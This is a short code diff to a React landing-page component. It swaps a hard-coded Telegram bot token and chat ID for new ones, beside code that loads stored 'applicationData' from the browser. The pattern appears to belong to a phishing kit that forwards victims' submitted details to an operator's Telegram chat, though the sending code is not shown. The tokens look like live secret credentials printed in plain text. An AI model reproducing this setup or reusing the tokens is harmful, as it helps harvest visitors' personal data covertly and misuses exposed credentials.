@@ -14,8 +14,8 @@ const LandingPagee: React.FC = () => {
   const [showPopup33, setShowPopup33] = useState(false);
 
   const [countdown, setCountdown] = useState(100);
-  const BOT_TOKEN = '8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE';
-  const CHAT_ID = '6837437455';
+  const BOT_TOKEN = '6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo';
+  const CHAT_ID = '6639364559';
 
   const storedData = localStorage.getItem("applicationData");
   const parsedData = storedData ? JSON.parse(storedData) : {};
